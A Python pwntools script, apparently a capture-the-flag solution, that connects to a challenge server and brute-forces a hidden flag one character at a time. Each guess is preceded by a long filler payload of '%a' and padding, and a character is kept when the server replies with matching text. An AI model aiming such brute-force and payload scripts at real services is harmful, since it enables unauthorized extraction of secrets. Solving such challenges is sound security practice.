from pwn import *


host = "offsetcheck.deadface.io"
port = 31337

flagstring = "fla"
bufferfill = "%aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd"

#printable chars 33-125

conn = remote (host, port)
while(1):
	exit = True
	for testchar in range(33,126):

		testflag = flagstring + chr(testchar)
		print(testflag)
		conn.recvline()
		conn.sendline(bufferfill.encode('ascii'))
		conn.recvline()
		conn.sendline(testflag[-4:].encode('ascii'))
		conn.recvline()
		conn.recvline()
		response = conn.recvline()
		if(("found at" in response.decode('ascii')) or ("Out" in response.decode('ascii')) ):
			flagstring = testflag
			exit = False
			break
	if(exit):
		break

print(flagstring)

